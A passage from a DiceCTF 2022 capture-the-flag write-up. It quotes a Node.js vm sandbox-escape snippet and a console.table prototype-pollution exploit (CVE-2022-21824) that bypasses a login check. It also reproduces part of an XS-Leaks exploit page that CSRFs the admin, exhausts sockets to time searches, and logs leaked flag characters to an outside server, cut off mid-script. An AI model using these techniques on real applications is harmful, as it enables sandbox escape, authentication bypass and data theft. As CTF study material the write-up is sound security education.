    <span class="token keyword">let</span> <span class="token punctuation">&#123;</span> user<span class="token punctuation">,</span> pass <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>user <span class="token operator">||</span> <span class="token operator">!</span>pass <span class="token operator">||</span> <span class="token keyword">typeof</span> user <span class="token operator">!==</span> <span class="token string">"string"</span> <span class="token operator">||</span> <span class="token keyword">typeof</span> pass <span class="token operator">!==</span> <span class="token string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">"Missing username or password!"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">let</span> hash <span class="token operator">=</span> <span class="token function">sha256</span><span class="token punctuation">(</span>pass<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>users<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">u</span> <span class="token operator">=></span> u<span class="token punctuation">.</span>user <span class="token operator">===</span> user <span class="token operator">&amp;&amp;</span> u<span class="token punctuation">.</span>pass <span class="token operator">===</span> hash<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">flag</span><span class="token operator">:</span> <span class="token keyword">await</span> fsp<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">"Incorrect username or password!"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Regarding VM escape, all I know is based on this file: <a target="_blank" rel="noopener" href="https://gist.github.com/jcreedcmu/4f6e6d4a649405a9c86bb076905696af">https://gist.github.com/jcreedcmu/4f6e6d4a649405a9c86bb076905696af</a></p>
<p>There are some interesting ways in it, such as this:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">////////</span>
<span class="token comment">// Also, the vm code could throw an exception, with proxies on it.</span>

<span class="token keyword">const</span> code5 <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">throw new Proxy(&#123;&#125;, &#123;
  get: function(me, key) &#123;
	 const cc = arguments.callee.caller;
	 if (cc != null) &#123;
		(cc.constructor.constructor('console.log(sauce)'))();
	 &#125;
	 return me[key];
  &#125;
&#125;)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>


<span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
  vm<span class="token punctuation">.</span><span class="token function">runInContext</span><span class="token punctuation">(</span>code5<span class="token punctuation">,</span> vm<span class="token punctuation">.</span><span class="token function">createContext</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// The following prints out 'laser' twice, (as side-effects of e</span>
  <span class="token comment">// being converted to a string) followed by &#123;&#125;, which is the effect</span>
  <span class="token comment">// of the console.log actually *on* this line printing out the</span>
  <span class="token comment">// stringified value of the exception, which is in this case a</span>
  <span class="token comment">// (proxy-wrapped) empty object.</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Throw a proxy out as an exception, and when someone executes toString on this exception, it will trigger and we can get the external function through <code>arguments.callee.caller</code>.</p>
<p>However, this problem is not about finding a vm2 0 day, but about using a Node.js 1 day to bypass this:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span><span class="token punctuation">(</span>users<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">u</span> <span class="token operator">=></span> u<span class="token punctuation">.</span>user <span class="token operator">===</span> user <span class="token operator">&amp;&amp;</span> u<span class="token punctuation">.</span>pass <span class="token operator">===</span> hash<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">flag</span><span class="token operator">:</span> <span class="token keyword">await</span> fsp<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>I think this bypass is also very powerful. Normally, <code>users.filter</code> will return an empty array because no conditions are met, so the length is usually checked. Here, however, the first element of the array is checked to see if it is undefined.</p>
<p>This is because if there is a prototype pollution vulnerability, we can pollute the first property of the array, and <code>[][0]</code> will have something, which will make the if statement true.</p>
<p>And this vulnerability is numbered <a target="_blank" rel="noopener" href="https://nodejs.org/en/blog/vulnerability/jan-2022-security-releases/#prototype-pollution-via-console-table-properties-low-cve-2022-21824">CVE-2022-21824</a>, and the way to use it is:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token literal-property property">x</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"__proto__"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>The first parameter of this API is the data, and the second parameter is the field to be displayed, like this:</p>
<p><img src="/img/dicectf2022/p2.png"></p>
<p>The fixed commit is this one: <a target="_blank" rel="noopener" href="https://github.com/nodejs/node/commit/3454e797137b1706b11ff2f6f7fb60263b39396b">https://github.com/nodejs/node/commit/3454e797137b1706b11ff2f6f7fb60263b39396b</a></p>
<p>From this, we can see that the problem is with the <code>map</code> object. Let’s take a closer look at the key part of the <code>console.table</code> code: <a target="_blank" rel="noopener" href="https://github.com/nodejs/node/blob/3454e797137b1706b11ff2f6f7fb60263b39396b/lib/internal/console/constructor.js#L482">lib&#x2F;internal&#x2F;console&#x2F;constructor.js</a></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// tabularData 是第一個參數 [&#123;x:1&#125;]</span>
<span class="token comment">// properties 是第二個參數 ["__proto__"]</span>
<span class="token keyword">const</span> map <span class="token operator">=</span> <span class="token function">ObjectCreate</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> hasPrimitives <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> valuesKeyArray <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> indexKeyArray <span class="token operator">=</span> <span class="token function">ObjectKeys</span><span class="token punctuation">(</span>tabularData<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> indexKeyArray<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> item <span class="token operator">=</span> tabularData<span class="token punctuation">[</span>indexKeyArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> primitive <span class="token operator">=</span> item <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">||</span>
      <span class="token punctuation">(</span><span class="token keyword">typeof</span> item <span class="token operator">!==</span> <span class="token string">'function'</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> item <span class="token operator">!==</span> <span class="token string">'object'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>properties <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> primitive<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    hasPrimitives <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    valuesKeyArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">_inspect</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> keys <span class="token operator">=</span> properties <span class="token operator">||</span> <span class="token function">ObjectKeys</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>
	
    <span class="token comment">// for of 的時候 key 會是 __proto__ </span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> key <span class="token keyword">of</span> keys<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span>
        map<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      
      <span class="token comment">// !ObjectPrototypeHasOwnProperty(item, key) 會成立</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>primitive <span class="token operator">&amp;&amp;</span> properties<span class="token punctuation">)</span> <span class="token operator">||</span>
           <span class="token operator">!</span><span class="token function">ObjectPrototypeHasOwnProperty</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span>

        <span class="token comment">// 因此 map[__proto__][0] 會是空字串</span>
        map<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
      <span class="token keyword">else</span>
        map<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">_inspect</span><span class="token punctuation">(</span>item<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>So through this method, we can pollute <code>Object.prototype[0]</code> and make it an empty string.</p>
<p>It seems that we should follow Node.js security updates, and there are many useful information.</p>
<h2><span id="webx2fnotekeeper2-solves">web&#x2F;noteKeeper(2 solves)</span></h2><p>I didn’t look at this problem carefully at the time, so I put it aside for future study: <a target="_blank" rel="noopener" href="https://brycec.me/posts/dicectf_2022_writeups#notekeeper">https://brycec.me/posts/dicectf_2022_writeups#notekeeper</a></p>
<h2><span id="webx2fdicevault2-solves">web&#x2F;dicevault(2 solves)</span></h2><p>I didn’t look at this problem carefully either, I only knew it was a tribute to another problem: <a target="_blank" rel="noopener" href="http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html">http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html</a></p>
<p>Author’s answer: <a target="_blank" rel="noopener" href="https://hackmd.io/fmdfFQ2iS6yoVpbR3KCiqQ#webdicevault">https://hackmd.io/fmdfFQ2iS6yoVpbR3KCiqQ#webdicevault</a></p>
<h2><span id="webx2fcarrot1-solves">web&#x2F;carrot(1 solves)</span></h2><p>This is also an interesting question, a very simple service that allows you to add notes and search, as shown below:</p>
<p><img src="/img/dicectf2022/p3.png"></p>
<p>When searching, it will search the content and display it if it exists. The backend code is as follows:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/tasks'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">tasks</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'username'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>

    tasks <span class="token operator">=</span> db<span class="token punctuation">.</span>get<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'tasks'</span><span class="token punctuation">]</span>

    <span class="token keyword">if</span> <span class="token string">'search'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">:</span>
        search <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">[</span><span class="token string">'search'</span><span class="token punctuation">]</span>
        tasks <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> task<span class="token punctuation">:</span> search <span class="token keyword">in</span> task<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tasks<span class="token punctuation">)</span><span class="token punctuation">)</span>

    tasks <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">sorted</span><span class="token punctuation">(</span>tasks<span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> task<span class="token punctuation">:</span> <span class="token operator">-</span>task<span class="token punctuation">[</span><span class="token string">'priority'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'tasks.html'</span><span class="token punctuation">,</span> tasks<span class="token operator">=</span>tasks<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The flag is hidden in the admin note and will be automatically created when started:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> <span class="token keyword">not</span> has<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	password <span class="token operator">=</span> config<span class="token punctuation">.</span>ADMIN_PASSWORD
	
	put<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
		<span class="token string">'tasks'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>
			<span class="token string">'title'</span><span class="token punctuation">:</span> <span class="token string">'flag'</span><span class="token punctuation">,</span>
			<span class="token string">'content'</span><span class="token punctuation">:</span> os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">'FLAG'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'dice&#123;flag&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
			<span class="token string">'priority'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
			<span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token number">0</span>
		<span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
		<span class="token string">'password'</span><span class="token punctuation">:</span> bcrypt<span class="token punctuation">.</span>hashpw<span class="token punctuation">(</span>password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> bcrypt<span class="token punctuation">.</span>gensalt<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>From the behavior of the admin bot and other observations, it seems to be an XS-Leaks problem. As long as you can observe whether the search result has a flag, it is enough, but the difficulty lies in not being able to figure out how to observe.</p>
<p>The official did not release this question and it seems that the answer will not be released (since it is not released, it may be a Chrome 0 day or an unrepaired bug?), but someone provided an XS-Leaks exploit after the game: <a target="_blank" rel="noopener" href="https://gist.github.com/kunte0/47c2b53535605d842f984e77d6c63eed">https://gist.github.com/kunte0/47c2b53535605d842f984e77d6c63eed</a></p>
<p>Complete code:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>DiceCTF 2022 web/carrot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Step 1: CSRF the admin user, to set a super long title for the flag note (LAX + POST form only possible for 2 minutes after cookies is created)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">csrf</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>do csrf<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Step 2: XS-Search with <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>connection-pool timing leak<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>, we have to use window.open (LAX cookie)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">popunder</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>open popup<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">exhaust_sockets</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>open 255 connections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">oracle</span><span class="token punctuation">(</span><span class="token string">'dice&#123;abc'</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>test search "abc" (slow)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">oracle</span><span class="token punctuation">(</span><span class="token string">'dice&#123;xxx'</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>test search "xxx" (fast)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>output</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">display</span><span class="token punctuation">:</span>none<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>number<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>priority<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>priority<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>9999</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5<span class="token punctuation">"</span></span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">

<span class="token comment">// this is send is used as logging</span>
<span class="token constant">LOG</span> <span class="token operator">=</span> <span class="token string">'Starting'</span>
<span class="token comment">// 255 in normal chrome, 99 in headless</span>
<span class="token constant">SOCKETLIMIT</span> <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">;</span>
<span class="token comment">// default</span>
<span class="token constant">TIMELIMIT</span> <span class="token operator">=</span> <span class="token number">800</span><span class="token punctuation">;</span>
<span class="token constant">INSTANCE</span> <span class="token operator">=</span> <span class="token string">''</span>
<span class="token constant">MYSERVER</span> <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">example.com</span><span class="token template-punctuation string">`</span></span>

<span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">ms</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> <span class="token function-variable function">time_fetch</span> <span class="token operator">=</span> <span class="token keyword">async</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> test_server_url <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">MYSERVER</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/?</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">LOG</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
